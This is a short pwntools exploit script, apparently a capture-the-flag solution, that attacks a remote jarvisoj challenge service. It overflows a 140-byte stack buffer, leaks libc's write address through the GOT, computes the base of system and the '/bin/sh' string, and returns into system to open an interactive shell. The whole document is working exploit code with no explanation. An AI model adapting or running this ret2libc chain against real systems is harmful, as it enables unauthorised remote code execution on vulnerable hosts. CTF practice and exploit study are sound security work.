#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/vul')
r = remote('pwn2.jarvisoj.com', 9879)

trash = 'a'*140
write = 0x8048340
write_off = 0x000dafe0
write_got = 0x804a018
system_off = 0x00040310
sh_off = 0x16084c
main = 0x8048484
ret = 0x08048483
print r.recvuntil('Input:\n')
pay1 = [write, main, 1, write_got, 4]
r.sendline(trash + flat(pay1))

base = u32(r.recv(4)) - write_off
print "base: ",hex(base)

system = system_off + base
sh = sh_off + base 

print r.recvuntil('Input:\n')
pay2 = [system, sh, sh]

r.sendline(trash + flat(pay2))

r.interactive()